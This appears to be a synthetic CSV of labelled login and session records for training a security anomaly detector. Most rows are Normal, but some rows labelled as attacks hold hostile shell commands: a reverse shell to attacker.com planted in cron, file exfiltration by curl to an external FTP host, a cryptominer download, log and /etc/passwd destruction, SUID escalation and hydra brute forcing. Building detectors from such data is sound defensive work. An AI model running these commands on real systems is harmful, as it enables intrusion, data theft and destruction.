timestamp,entity_id,entity_type,login_hour,day_of_week,session_duration,command_length,unique_resources,failed_login_count,is_known_device,is_known_location,auth_method,source_ip,geo_location,device_fingerprint,resource_accessed,command_sequence,login_success,label
2024-07-17 07:57:20,user_0026,contractor,15,1,3307,192,5,0,1,1,sso,10.132.123.249,"Berlin, DE",b3b459ca75ef7a99cd3114fb5d299b5a,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-06-07 08:36:03,user_0177,contractor,12,0,812,54,1,0,1,1,password,172.18.38.68,"New York, US",5b2f6b039e7474bdfb97c9aed35c753c,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-04-10 14:06:04,user_0027,employee,8,0,2829,28,4,0,1,1,sso,192.168.83.113,"Berlin, DE",5bbfedc25c01bc41d95f0661877db16f,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-01-05 08:31:29,user_0121,admin,6,1,69,600,16,10,0,0,password,98.50.11.72,"Sao Paulo, BR",da152c5be628ce41ad54c28df2a59b5f,secrets_vault,nmap -sV 10.0.0.0/24; netstat -an; ifconfig; whoami,0,Recon Activity
2024-11-23 01:02:54,user_0102,contractor,8,1,3028,70,4,1,1,1,password,192.168.16.101,"Tokyo, JP",ad5272f085c1b5c70e9487a0346d2867,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-01-01 03:38:48,user_0102,employee,12,4,366,152,2,1,1,1,password,192.168.81.118,"Berlin, DE",999fd36ad116983477386bf8b4fe6310,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-04-08 00:55:46,user_0062,contractor,18,0,2610,75,4,1,1,1,mfa,10.67.91.205,"London, UK",6f8215fa0e4ab5a633fad5bedb1edb07,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-03-11 02:23:16,user_0078,employee,12,1,956,132,3,1,1,1,password,10.87.55.135,"Berlin, DE",cac40b606b71c1173755d91b073ed2ab,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-03-06 02:15:22,user_0032,employee,11,2,3222,175,4,1,1,1,sso,10.107.82.249,"Singapore, SG",bab66a5ef893ce40f2dc1372f407ad07,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-02-19 04:38:34,user_0192,contractor,10,1,1591,36,1,1,1,1,mfa,172.17.5.89,"Berlin, DE",dfd7491cec539635fefee43edaa111f7,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-01-04 09:28:49,user_0172,service_account,3,2,142,1789,0,0,0,0,certificate,140.240.109.125,"Moscow, RU",44d4c237cd439e5cf9c0379b5342e1b5,vpn_gateway,crontab -e; echo '@reboot nc -e /bin/sh attacker.com 4444',1,Persistence Mechanism
2024-04-07 02:53:58,user_0069,contractor,8,1,669,58,1,1,1,1,password,10.192.74.118,"Berlin, DE",b3197cf130969c34584b5612f2661326,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-07-08 03:30:59,user_0165,employee,13,4,1224,145,5,1,1,1,password,172.21.193.210,"Singapore, SG",b8172b4e735e88acce403ec4436a66e7,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-03-12 11:17:45,user_0075,employee,10,4,2181,181,3,1,1,1,password,172.20.55.182,"Tokyo, JP",dd24087cde4b8919e87d405474d3459a,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-02-21 12:24:04,user_0108,employee,15,3,2000,157,4,0,1,1,sso,172.30.197.19,"New York, US",54a92da4997d0827ce9dbdfda377999d,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-06-26 21:59:02,user_0151,contractor,17,4,3200,91,5,0,1,1,mfa,10.216.63.170,"Singapore, SG",b59343edbb69f09504b946ef779edb2c,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-04-15 10:01:38,user_0184,employee,11,1,1819,44,1,1,1,1,password,10.89.117.157,"Singapore, SG",c49fa48dbeef99f3d0253c96470e906d,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-09-19 11:21:46,user_0170,contractor,21,1,19,1,0,8,0,0,password,221.14.146.62,"Beijing, CN",797d9472e7c9be5a39eea84eb8791f98,customer_data,unknown_cmd,0,Failed Login
2024-07-08 00:21:35,user_0032,contractor,8,4,541,196,5,1,1,1,sso,10.14.196.44,"New York, US",3fbdf9f1a3018a4577d0d56ac27b3f88,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-02-04 17:55:46,user_0166,admin,0,2,160,958,6,7,0,0,password,122.99.11.224,"Moscow, RU",491ca6cdfdf2d8b6430f81419416dd26,secrets_vault,nmap -sV 10.0.0.0/24; netstat -an; ifconfig; whoami,0,Recon Activity
2024-07-21 17:44:33,user_0160,contractor,10,4,3481,159,1,1,1,1,mfa,172.30.190.153,"Singapore, SG",e0c497c93a9e37c76623d8a02575cc68,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-02-04 02:40:45,user_0102,contractor,12,0,2643,27,4,1,1,1,mfa,10.120.15.19,"London, UK",60a920d90ae0ca95d0c8e30743c6ce6f,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-01-09 22:01:18,user_0142,employee,18,4,3375,88,3,0,1,1,mfa,10.241.31.15,"Tokyo, JP",eca00f8272f9fa2766b8dbf192265a02,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-01-17 06:17:46,user_0190,contractor,12,1,474,137,4,0,1,1,mfa,172.21.193.150,"London, UK",e7ab9cb606f8a6b778b3bf90767fded3,email_server,ls -la; cat report.txt; logout,1,Normal
2024-11-23 23:30:52,user_0154,service_account,6,6,888,1265,7,0,1,1,certificate,192.168.149.72,"Mexico City, MX",71e8ae0cf543f904e8d24c8a17f89393,devops_pipeline,sudo bash; chmod 4755 /usr/bin/find; visudo,1,Privilege Escalation
2025-06-12 15:56:34,user_0143,employee,11,1,2121,185,2,0,1,1,sso,172.19.109.141,"Berlin, DE",fe80b2e569c4aeff9a3b803116c618a5,email_server,ls -la; cat report.txt; logout,1,Normal
2024-06-13 17:11:50,user_0111,employee,14,4,2064,150,3,0,1,1,mfa,192.168.209.125,"Berlin, DE",f33e7f4831bd4e11565272fa55ad930c,email_server,ls -la; cat report.txt; logout,1,Normal
2025-05-05 03:48:22,user_0117,employee,14,0,1539,40,5,0,1,1,sso,192.168.234.38,"Berlin, DE",4ae206b530ac47f9ebe6d0feec02c08c,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-05-03 23:26:49,user_0022,contractor,15,0,93697,261,8,4,0,0,vpn,195.44.219.163,"Moscow, RU",4f6f65fd4101955bdc2383e6bb699325,devops_pipeline,ssh admin@192.168.1.50; sudo su; scp -r /etc root@10.0.0.2:/tmp,1,Session Hijacking
2024-08-25 00:40:06,user_0013,contractor,11,1,3329,145,1,0,1,1,sso,172.22.220.91,"Berlin, DE",a513c9f9e3e60067e02254e79932e3bb,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-03-14 20:51:03,user_0026,employee,10,2,1820,81,5,0,1,1,password,10.28.115.239,"Singapore, SG",caaf85093497e8e31b6beac8e9ed9c99,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-05-29 21:48:23,user_0090,contractor,8,1,2532,52,4,0,1,1,mfa,10.233.50.90,"Berlin, DE",d4ba2220faccce279bbcfd45e7b4177d,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-04-05 23:01:52,user_0184,employee,9,3,2897,112,1,1,1,1,sso,172.17.29.21,"Singapore, SG",6c0e446dfb5b02814746847eeb09da77,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-06-13 13:11:51,user_0110,contractor,12,2,1461,106,5,0,1,1,sso,10.40.43.1,"Tokyo, JP",969b3ca134f672c76e4a1f2908b29037,email_server,ls -la; cat report.txt; logout,1,Normal
2024-01-22 17:16:12,user_0137,employee,12,3,1071,110,5,0,1,1,sso,172.19.137.235,"Tokyo, JP",1506183f4fcdd82c88cf747e1833b7b2,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-12-02 23:59:08,user_0006,contractor,12,2,2384,96,4,1,1,1,password,192.168.150.230,"Singapore, SG",b2afd710157f6d3e74914cc468769093,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-04-18 11:24:20,user_0164,contractor,15,4,819,115,3,0,1,1,password,192.168.232.226,"New York, US",3a92624bd08fe51e32aff5c05353ab50,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-11-11 04:31:04,user_0054,contractor,14,3,3304,135,4,1,1,1,mfa,172.16.203.54,"Berlin, DE",8940ae8dc1ca3aaaaf8b65b7bcf2851b,email_server,ls -la; cat report.txt; logout,1,Normal
2024-03-18 08:44:30,user_0008,employee,9,3,3077,26,2,1,1,1,sso,10.93.68.65,"Berlin, DE",bfbb55434e55f5a534a4eafc0cfb7924,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-01-20 08:23:43,user_0116,employee,15,4,3218,71,4,0,1,1,mfa,10.200.167.33,"Berlin, DE",9afa323676124303a81782089c12929e,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-12-31 10:10:09,user_0160,employee,14,3,417,142,2,0,1,1,mfa,10.119.157.10,"London, UK",57c89520f2bcf4f78693e9141cffa895,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-04-07 17:42:16,user_0165,employee,10,4,2169,148,5,1,1,1,sso,172.29.5.67,"Tokyo, JP",8661dcb0f37298cc50f5695ed9a1063c,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-01-09 09:01:01,user_0137,contractor,15,4,2221,166,3,1,1,1,mfa,192.168.151.144,"Berlin, DE",185897c58f450b47dca1003a4409c332,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-06-17 21:19:28,user_0146,employee,13,3,1008,144,5,0,1,1,sso,172.31.145.149,"Berlin, DE",c9046be13558e3ac17c6c793954c374f,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-09-16 11:22:57,user_0021,employee,10,4,3170,46,1,1,1,1,password,10.194.66.41,"London, UK",e6d2fc5930dd33592e24af96ff7156d2,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-04-19 19:15:38,user_0193,contractor,11,4,1751,122,1,0,1,1,sso,172.16.0.166,"Tokyo, JP",2f02a2e7b36befbbd86066cd8edf0521,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-03-22 23:17:36,user_0161,contractor,12,2,3590,87,4,1,1,1,mfa,172.27.113.57,"London, UK",3a06742c3681a368a4961adea2a8343f,email_server,ls -la; cat report.txt; logout,1,Normal
2025-02-21 17:38:39,user_0153,contractor,11,3,1587,83,4,0,1,1,password,172.26.32.116,"Singapore, SG",9ec1bea94b99f07efa6c71c16006fdd0,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-01-26 22:12:49,user_0113,admin,3,2,309,1152,6,3,1,1,password,172.26.116.250,"Mumbai, IN",0e40d0be8d32afdb683bfb9bff5b92c5,payroll_system,rm -rf /var/log/*; shred -u /etc/passwd; history -c,1,Data Destruction
2025-05-24 09:00:58,user_0044,contractor,15,3,2994,174,4,1,1,1,sso,10.236.81.189,"Singapore, SG",57509b6461f803eba5b923deb99913b6,email_server,ls -la; cat report.txt; logout,1,Normal
2025-05-19 12:41:23,user_0081,contractor,11,0,406,67,4,1,1,1,sso,192.168.150.39,"New York, US",a6c4bc55916a79e7b481da22c97e6868,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-01-06 14:47:21,user_0135,employee,16,2,3211,91,3,0,1,1,mfa,10.223.231.235,"Berlin, DE",a2823ba68f7a19b1956302cbdb5d7623,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-08-12 20:02:56,user_0123,contractor,15,0,3416,129,2,0,1,1,sso,192.168.54.86,"Singapore, SG",0c9a795d19b1314815a1f86ee73f3b5d,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-02-25 09:28:05,user_0053,contractor,16,2,1410,56,3,0,1,1,password,192.168.86.168,"New York, US",232ac88ff8baebd4fda7380dd6c13055,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-06-04 19:35:27,user_0103,employee,13,0,1691,135,1,1,1,1,password,172.31.185.135,"Singapore, SG",717945bf9e0a7420355eef931232f8ae,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-12-26 09:59:14,user_0196,employee,18,0,1870,168,4,1,1,1,mfa,172.16.149.211,"London, UK",837db7e41ada7c273ac8f646a4f7b369,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-01-21 09:40:21,user_0170,employee,18,0,3233,58,4,1,1,1,mfa,10.56.57.116,"Tokyo, JP",888a8aca7aff74824c7be8ba8c065f08,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-01-28 13:22:45,user_0077,contractor,8,0,3109,105,3,1,1,1,sso,10.162.106.51,"Singapore, SG",a2e6c4abb546628b4d1bbe9835358a79,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-01-18 08:47:22,user_0048,contractor,23,6,2322,2568,6,4,0,1,api_key,192.168.59.182,"Toronto, CA",89ca33c55b1a1b3a0fa49c859084e853,admin_console,tar czf /tmp/data.tgz /home/user/docs; curl -T /tmp/data.tgz ftp://external.host,1,Data Exfiltration
2024-08-08 16:01:27,user_0051,employee,11,2,3244,64,3,0,1,1,password,172.18.214.35,"London, UK",8185a5e59eeab7837bdba5246454bd7c,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-03-04 05:32:58,user_0054,contractor,18,4,565,62,5,1,1,1,sso,192.168.145.4,"Singapore, SG",35309e0a6d5fcf9b232c4e316366581d,email_server,ls -la; cat report.txt; logout,1,Normal
2024-04-22 03:30:26,user_0115,employee,18,0,1810,103,4,1,1,1,sso,172.23.206.44,"Singapore, SG",97e7e3bc4d2c0b4fa2b6c9485a27668e,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-10-11 21:32:01,user_0086,contractor,14,2,842,108,3,0,1,1,mfa,172.30.15.244,"Berlin, DE",cd94a2ff85c6f9ce905a023e912bb3dc,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-04-30 19:29:17,user_0008,contractor,23,2,4927,2418,17,1,1,1,api_key,172.30.183.161,"Mexico City, MX",a07aaa3b17d399c89c7663e328471607,backup_storage,tar czf /tmp/data.tgz /home/user/docs; curl -T /tmp/data.tgz ftp://external.host,1,Data Exfiltration
2025-04-19 18:28:35,user_0133,contractor,14,4,532,159,1,1,1,1,mfa,172.25.216.9,"New York, US",aaed81cc84bb8a824808c2771ad17b24,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-08-15 21:46:50,user_0092,contractor,11,3,3417,55,4,0,1,1,mfa,192.168.103.254,"Tokyo, JP",b991ad937fbde62161abd54edcf85660,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-01-21 07:25:47,user_0006,contractor,13,1,3215,43,2,0,1,1,mfa,172.16.175.84,"New York, US",a55d90dae19f35878ec5f83d7716d32f,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-03-24 14:29:44,user_0006,contractor,18,1,1614,71,2,1,1,1,mfa,192.168.3.129,"Singapore, SG",dafd37f16ffefcf08539a5287499282f,email_server,ls -la; cat report.txt; logout,1,Normal
2025-04-19 12:43:03,user_0038,employee,17,0,412,56,3,0,1,1,password,172.24.61.77,"New York, US",6d13434bcce7b55d36131d85f34a1dcc,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-06-26 17:21:39,user_0042,vendor,3,3,44935,670,0,0,0,0,password,130.25.240.117,"Mexico City, MX",58e7983d56edf367c13b41d4d1056d35,backup_storage,wget miner.exe; chmod +x miner.exe; ./miner.exe --pool pool.minexmr.com,1,Cryptomining
2024-05-07 10:30:36,user_0071,contractor,5,1,57,985,16,0,0,0,password,113.59.53.49,"Toronto, CA",1f956938bc580c66f156e0a85d3363b9,backup_storage,nmap -sV 10.0.0.0/24; netstat -an; ifconfig; whoami,0,Recon Activity
2024-07-29 07:01:08,user_0154,contractor,18,1,1646,149,4,1,1,1,sso,172.20.151.141,"Berlin, DE",d39072f96bec463d76bfb1462cca64db,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-07-07 10:56:40,user_0150,employee,12,4,1904,33,3,0,1,1,password,10.56.51.24,"Tokyo, JP",a5844f14173e9c9c4bdffaa007aa2b8e,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-02-29 16:24:46,user_0186,employee,17,4,2334,103,4,0,1,1,mfa,192.168.220.143,"Singapore, SG",2f9d1c8ed643b8aa5eda495dd5bd5ebc,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-12-22 00:54:03,user_0104,employee,2,5,229,1602,2,2,0,0,certificate,177.165.98.113,"Mexico City, MX",c8c9cbb5de2c29a7fcb735d96ed2833f,email_server,crontab -e; echo '@reboot nc -e /bin/sh attacker.com 4444',1,Persistence Mechanism
2024-05-23 23:26:59,user_0088,contractor,17,1,1623,115,5,1,1,1,mfa,192.168.143.246,"Berlin, DE",8859ac207160ab3da9413a48e74e1660,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-03-04 00:51:00,user_0191,employee,9,0,315,130,2,0,1,1,password,10.47.24.239,"New York, US",455af55e808d5e07d9ae7998ac43d943,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-03-01 14:20:14,user_0178,employee,15,0,1170,23,2,1,1,1,mfa,10.195.139.54,"London, UK",7603e8951709a219df5cfb5be07d7627,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-12-24 15:10:44,user_0103,employee,9,2,626,133,3,1,1,1,sso,192.168.79.210,"New York, US",852c99968428022626cfddfda78ae72e,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-03-29 14:32:35,user_0111,employee,3,6,216,1402,2,3,0,0,certificate,162.85.1.87,"Sydney, AU",321a00be13c947abdda91de5f16c60c4,email_server,crontab -e; echo '@reboot nc -e /bin/sh attacker.com 4444',1,Persistence Mechanism
2025-06-03 13:52:12,user_0197,contractor,11,1,3057,121,1,0,1,1,password,10.80.181.189,"Singapore, SG",12097bf5d7a34f0a363ec1299adb4648,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-02-07 00:39:30,user_0094,service_account,6,3,61125,522,0,0,0,1,password,180.171.152.136,"Sydney, AU",a6fede97e3e2312be90348d2329d4364,payroll_system,wget miner.exe; chmod +x miner.exe; ./miner.exe --pool pool.minexmr.com,1,Cryptomining
2024-09-08 15:29:23,user_0002,contractor,14,3,1836,286,5,4,0,0,oauth,144.130.101.191,"Beijing, CN",0b0a3f5a4d7574fe72bfe04a52821ff2,payroll_system,ls -la; cat report.txt; logout,1,Impossible Travel
2024-05-11 03:46:38,user_0040,contractor,4,5,125,1132,8,4,0,0,password,45.200.85.207,"Cape Town, ZA",967342468378a5c8ba0447a324812cbe,customer_data,nmap -sV 10.0.0.0/24; netstat -an; ifconfig; whoami,0,Recon Activity
2024-12-31 11:26:14,user_0031,employee,18,4,2676,178,1,1,1,1,password,172.18.66.117,"Singapore, SG",90421ff8ce89ea1b1e79b35a27a4c9c9,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-12-11 09:43:53,user_0114,employee,13,0,3108,114,5,1,1,1,password,192.168.46.144,"Tokyo, JP",7c9d8dff3e28a5e042f49804c24db07d,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-12-02 18:14:37,user_0133,employee,18,0,2947,83,1,0,1,1,password,172.27.167.145,"New York, US",603164a6600c117f541ca55cff92ac33,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-09-04 02:19:22,user_0161,contractor,14,3,2082,159,2,0,1,1,mfa,172.27.97.246,"London, UK",18d7b7369606bae57de3ff9df849fc32,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-01-06 18:30:18,user_0155,contractor,11,4,1402,125,5,1,1,1,password,10.13.235.145,"New York, US",615944c2d97d63963ba8906986e6911f,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-01-31 03:47:08,user_0105,employee,14,4,965,69,4,1,1,1,sso,192.168.247.90,"Berlin, DE",7192837e1fa16b90c8e394103b2d3ee7,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-04-12 16:24:30,user_0069,employee,16,1,2726,135,2,0,1,1,password,10.164.134.233,"Singapore, SG",9bc4e70d5ee6c520d5c8d709ede39428,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-04-08 10:27:11,user_0147,contractor,16,4,648,98,2,1,1,1,password,192.168.237.229,"Tokyo, JP",d745f82dd80aa5c2eb55099dee7f27d2,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-04-21 04:08:59,user_0197,employee,12,1,3114,195,3,1,1,1,password,10.100.204.7,"Tokyo, JP",4bdf18ecd1cffd5393f07da9c3e26ce3,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-03-02 17:21:38,user_0006,employee,15,4,2667,116,5,1,1,1,password,10.113.148.35,"Singapore, SG",c9045a7a1da6c209c5a389913af9a53c,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-12-28 22:30:56,user_0055,employee,16,3,2514,63,1,0,1,1,mfa,10.57.186.206,"New York, US",49bd0304d2e4e3ccc20ae5f02120610e,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-07-03 04:12:23,user_0026,contractor,11,3,1203,38,4,1,1,1,password,192.168.204.44,"Tokyo, JP",ccca03fb388f7cac38b5e016c4be4972,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-10-09 04:26:30,user_0001,employee,8,1,3368,118,1,1,1,1,password,10.99.62.7,"London, UK",97c438087f1e0e3d50d125f7cbab6b14,email_server,ls -la; cat report.txt; logout,1,Normal
2025-04-14 16:38:06,user_0189,employee,10,3,3170,60,4,0,1,1,sso,192.168.163.53,"New York, US",ccc7fefba6f2a56bf07b061cb0d69dac,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-04-07 05:59:56,user_0064,employee,1,1,29,31,1,20,1,0,password,178.39.166.220,"Sao Paulo, BR",afb662b7f7424dbd2f70aef5778fd4a5,backup_storage,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target,0,Credential Abuse
2024-11-20 22:58:42,user_0091,contractor,3,6,50087,616,4,2,0,0,password,108.30.87.16,"Moscow, RU",30816faf92cd956a6864310c3211b444,admin_console,wget miner.exe; chmod +x miner.exe; ./miner.exe --pool pool.minexmr.com,1,Cryptomining
2024-08-08 08:19:41,user_0028,contractor,15,4,673,84,4,0,1,1,sso,10.251.157.13,"Singapore, SG",56878b96711f104eec2de968fac18b57,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-05-12 08:41:11,user_0086,contractor,11,4,1903,69,5,1,1,1,password,10.222.5.91,"Singapore, SG",d92c35c8d81c2b6a1c29d0d0b339c796,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-04-11 00:09:09,user_0019,contractor,9,3,2671,51,1,0,1,1,password,172.29.202.98,"Tokyo, JP",6402951c5080b9a212b6965acdb59c15,email_server,ls -la; cat report.txt; logout,1,Normal
2024-07-28 15:59:55,user_0029,employee,10,3,1202,188,2,1,1,1,mfa,172.16.137.113,"New York, US",31494b890c79aeddde2f55223311f899,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-02-29 10:40:10,user_0142,employee,16,0,2391,128,4,0,1,1,mfa,10.144.144.77,"Singapore, SG",c93769373a7c3d966e6bd2e5826836a2,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-09-06 21:59:14,user_0140,contractor,9,2,2892,94,4,0,1,1,password,192.168.115.152,"Berlin, DE",edc47289bacad8c6c13e71e43d73164c,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-01-03 20:32:31,user_0134,contractor,10,3,2917,168,1,0,1,1,password,172.29.172.219,"London, UK",ce5e91c58fee6976f4a7b106e331ea23,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-01-21 12:39:13,user_0003,vendor,16,6,95010,530,11,0,0,0,vpn,158.124.92.106,"Sydney, AU",4788a39df2500490c7114e80011666c7,devops_pipeline,ssh admin@192.168.1.50; sudo su; scp -r /etc root@10.0.0.2:/tmp,1,Session Hijacking
2024-05-07 12:31:18,user_0131,contractor,11,1,2496,21,5,1,1,1,mfa,10.5.24.99,"Singapore, SG",3de40deb0099c4a51b8be1969dfe76fb,email_server,ls -la; cat report.txt; logout,1,Normal
2024-04-29 10:34:57,user_0083,employee,9,3,3198,188,4,1,1,1,sso,172.27.176.220,"Berlin, DE",764b60ab46fc36c7c499611c67683de0,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-03-01 22:20:27,user_0072,employee,10,4,1244,98,5,0,1,1,password,10.252.113.164,"Berlin, DE",aeb8aed4f2cac4bdde4f36b1711b6242,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-05-04 23:49:20,user_0015,employee,10,2,1581,117,1,1,1,1,mfa,10.0.25.32,"Berlin, DE",1a0b6b1042f4dcf0b76ecfcaf0cc1db4,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-03-04 01:26:38,user_0170,employee,11,1,2560,39,2,0,1,1,mfa,172.28.241.104,"Tokyo, JP",98fc354c6ca3da5338c1e484e9139dfd,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-04-22 23:44:59,user_0183,admin,3,5,737,1037,14,0,1,1,certificate,172.23.19.34,"Beijing, CN",c95d4c2b5f1a6d26493cb883ddbfe3d2,customer_data,sudo bash; chmod 4755 /usr/bin/find; visudo,1,Privilege Escalation
2025-02-11 20:07:25,user_0087,employee,12,2,1660,160,2,0,1,1,password,10.120.116.218,"Tokyo, JP",c7a8fb627936b4dda2d675b1c45ec413,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-07-19 02:32:38,user_0185,contractor,18,0,3025,54,5,1,1,1,password,172.26.170.105,"Berlin, DE",3ab28c7884e54b9f6fea1e6a6ad8d536,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-01-18 05:58:24,user_0016,contractor,14,2,3333,106,2,0,1,1,mfa,172.16.225.221,"Singapore, SG",5fa40e1e0a9896e7b580fa67cb3ecaf9,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-05-05 08:15:46,user_0063,employee,15,3,3368,106,2,1,1,1,password,172.27.210.47,"Berlin, DE",e7377048d2419f6a8932d0315ac5cca9,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-01-14 05:00:54,user_0049,contractor,17,0,2866,197,4,0,1,1,sso,10.159.7.205,"Tokyo, JP",0b122cc0544dea3e1642a6c330afc1d9,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-03-12 20:58:55,user_0090,employee,9,0,2652,115,1,0,1,1,mfa,192.168.101.10,"New York, US",442045e56bee2e69838695866b09af02,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-03-19 01:15:33,user_0125,service_account,6,2,842,809,12,1,1,1,certificate,172.24.178.158,"Mexico City, MX",ac5b17aab41e1a9b8f3199a309e79172,email_server,sudo bash; chmod 4755 /usr/bin/find; visudo,1,Privilege Escalation
2024-01-30 07:38:02,user_0182,employee,17,0,1657,163,3,1,1,1,sso,172.17.72.157,"London, UK",121265a4ecc9ad321ac30caa3d134573,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-06-02 07:11:56,user_0043,contractor,9,0,2037,146,2,1,1,1,password,192.168.113.93,"Singapore, SG",025cf0c3dec33aedd211f6104db0496d,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-06-08 06:40:42,user_0180,employee,16,3,858,77,2,1,1,1,sso,172.31.110.125,"Berlin, DE",41a88744c8686a98109b273c98ce6fd6,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-01-31 18:20:12,user_0165,contractor,18,2,3374,26,2,1,1,1,mfa,172.29.240.180,"London, UK",9da02e6d71b4066fc000d057caf82b84,customer_data,ls -la; cat report.txt; logout,1,Normal
